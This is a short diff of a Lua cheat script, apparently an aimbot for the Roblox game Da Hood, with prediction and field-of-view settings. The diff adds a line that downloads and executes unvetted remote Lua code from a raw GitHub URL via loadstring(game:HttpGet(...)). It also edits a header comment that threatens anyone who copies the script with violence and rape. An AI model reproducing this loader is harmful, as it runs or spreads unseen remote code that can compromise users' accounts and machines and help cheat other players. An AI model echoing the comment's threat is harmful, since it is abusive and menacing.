@@ -1,5 +1,7 @@
     --https://github.com/Nosssa
---Skid this shit *cough cough* electric hood modded *cough cough* and i will knock your teeth out and rape your sister
+--Skid this shit *cough cough* electric hood modded *cough cough*, *cough cough* trip hub and i will knock your teeth out and rape your sister
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CorruptOblivion/DaHood/main/betathings/awfawfasfwas.lua'))()
+
 _G.Prediction =  (  .18  )
 
 _G.FOV =  (  250  )
